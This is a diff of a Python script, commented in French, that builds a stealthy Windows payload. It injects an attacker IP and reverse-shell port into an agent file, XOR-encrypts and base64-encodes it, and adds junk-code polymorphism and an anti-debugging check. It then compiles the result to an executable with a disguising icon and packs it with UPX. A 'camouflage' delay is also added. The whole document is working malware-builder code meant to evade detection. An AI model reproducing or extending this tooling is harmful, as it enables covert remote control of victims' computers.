@@ -6,56 +6,51 @@ import string
 import subprocess
 import base64
 import time
+import argparse
 
-# 📦 Import config globale
+# 📦 Import config globale (fallback si .env pas encore chargé)
 try:
-    from core.config import LHOST, LPORT
+    from core.config import LHOST as CONFIG_LHOST, LPORT as CONFIG_LPORT
 except:
-    LHOST, LPORT = "127.0.0.1", 4444  # fallback si .env non chargé
+    CONFIG_LHOST, CONFIG_LPORT = "127.0.0.1", 4444
 
+# 📁 Chemins
 BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 AGENT_FILE = os.path.join(BASE_DIR, "agents", "windows", "agent_win.py")
 WRAPPER_TEMPLATE = os.path.join(BASE_DIR, "build", "template_wrapper.py")
 WRAPPER_OUTPUT = os.path.join(BASE_DIR, "build", "temp_wrapper.py")
 OUTPUT_DIR = os.path.join(BASE_DIR, "build", "output")
-ICON_PATH = os.path.join(BASE_DIR, "assets", "win_ico.ico")
+ICON_DEFAULT = os.path.join(BASE_DIR, "assets", "win_ico.ico")
 UPX_PATH = r"C:\Tools\upx-5.0.2-win64\upx.exe"
 os.makedirs(OUTPUT_DIR, exist_ok=True)
 
-XOR_KEY = 13  # Peut être remplacé par AES
-RANDOM_DELAY = random.randint(3, 12)  # Pour camouflage
+# ⚙️ Paramètres
+XOR_KEY = 13
+RANDOM_DELAY = random.randint(3, 12)
 
+# 🔧 Utilitaires
 def random_string(length=10):
-    first = random.choice(string.ascii_letters)  # Première lettre valide
-    rest = ''.join(random.choices(string.ascii_letters + string.digits, k=length - 1))
-    return first + rest
+    return random.choice(string.ascii_letters) + ''.join(random.choices(string.ascii_letters + string.digits, k=length-1))
 
 def xor_encrypt(data, key):
     return ''.join([chr(ord(c) ^ key) for c in data])
 
 def polymorphic_wrapper(template: str) -> str:
-    """Ajoute des commentaires aléatoires, des variables inutiles (junk)"""
     junk = "\n".join([f"{random_string(5)} = '{random_string(6)}'" for _ in range(10)])
-    anti_dbg = "import sys\nif sys.gettrace(): exit()\n"  # Anti-debug simple
+    anti_dbg = "import sys\nif sys.gettrace(): exit()\n"
     return anti_dbg + "\n" + junk + "\n" + template
 
 def inject_wrapper(encoded_payload, xor_key):
     with open(WRAPPER_TEMPLATE, "r", encoding="utf-8") as f:
         template = f.read()
-
-    # Injection des données
     wrapper_final = template.replace("<ENCRYPTED_B64_PAYLOAD>", f'"{encoded_payload}"')
     wrapper_final = wrapper_final.replace("XOR_KEY = 13", f"XOR_KEY = {xor_key}")
-
-    # Polymorphisme (junk + anti-debug)
     wrapper_final = polymorphic_wrapper(wrapper_final)
-
     with open(WRAPPER_OUTPUT, "w", encoding="utf-8") as f:
         f.write(wrapper_final)
-
     print("[✔] Wrapper injecté avec polymorphisme et protections.")
 
-def compile_exe(output_name="payload_windows.exe", icon_path=ICON_PATH, compress=True):
+def compile_exe(output_name="payload_windows.exe", icon_path=None, compress=True):
     cmd = [
         "pyinstaller",
         "--noconfirm",
@@ -65,7 +60,6 @@ def compile_exe(output_name="payload_windows.exe", icon_path=ICON_PATH, compress
         "--distpath", OUTPUT_DIR,
         WRAPPER_OUTPUT
     ]
-
     if icon_path and os.path.exists(icon_path):
         cmd += ["--icon", icon_path]
         print(f"[✔] Icône utilisée : {icon_path}")
@@ -76,29 +70,38 @@ def compile_exe(output_name="payload_windows.exe", icon_path=ICON_PATH, compress
     subprocess.run(cmd, check=True)
 
     exe_path = os.path.join(OUTPUT_DIR, output_name)
-
     if compress and os.path.exists(exe_path):
-        print("[*] Compression UPX avec --force...")
         try:
             subprocess.run([UPX_PATH, "--best", "--lzma", "--force", exe_path], check=True)
+            print("[✔] Compression UPX terminée.")
         except subprocess.CalledProcessError as e:
             print(f"[❌] Erreur UPX : {e}")
-        else:
-            print("[✔] Compression UPX terminée.")
-
     print(f"[✔] Payload final : {exe_path}")
 
+# 🚀 Main
 def main():
-    print("[*] Délai aléatoire (camouflage) :", RANDOM_DELAY, "secondes")
+    parser = argparse.ArgumentParser(description="Packager de payload Windows furtif")
+    parser.add_argument("--platform", choices=["windows"], default="windows", help="Plateforme cible")
+    parser.add_argument("--lhost", help="Adresse IP attaquant (LHOST)")
+    parser.add_argument("--lport", type=int, help="Port reverse shell (LPORT)")
+    parser.add_argument("--icon", help="Icône du payload")
+    args = parser.parse_args()
+
+    lhost = args.lhost or CONFIG_LHOST
+    lport = args.lport or CONFIG_LPORT
+    icon_path = args.icon or ICON_DEFAULT
+
+    print(f"[*] Délai aléatoire (camouflage) : {RANDOM_DELAY}s")
     time.sleep(RANDOM_DELAY)
 
     print("[*] Lecture de l'agent...")
     with open(AGENT_FILE, "r", encoding="utf-8") as f:
         code = f.read()
 
-    # 🔁 Insertion dynamique LHOST / LPORT
-    code = code.replace("LHOST_PLACEHOLDER", f'"{LHOST}"')
-    code = code.replace("LPORT_PLACEHOLDER", f"{LPORT}")
+    # ✅ Remplacement dynamique LHOST / LPORT
+    code = code.replace("LHOST_PLACEHOLDER", f'"{lhost}"')
+    code = code.replace("LPORT_PLACEHOLDER", f"{lport}")
+    print(f"[✔] Remplacement : LHOST={lhost}, LPORT={lport}")
 
     print("[*] Chiffrement XOR + base64...")
     encrypted = xor_encrypt(code, XOR_KEY)
@@ -108,10 +111,9 @@ def main():
     inject_wrapper(encoded, XOR_KEY)
 
     print("[*] Compilation...")
-    compile_exe()
+    compile_exe(icon_path=icon_path)
 
-    print("[✔] Fichier généré dans : build/output/")
-    print("[ℹ️] Aucun fichier ni dossier n'a été supprimé.")
+    print("[✔] Payload généré dans : build/output/")
 
 if __name__ == "__main__":
     main()
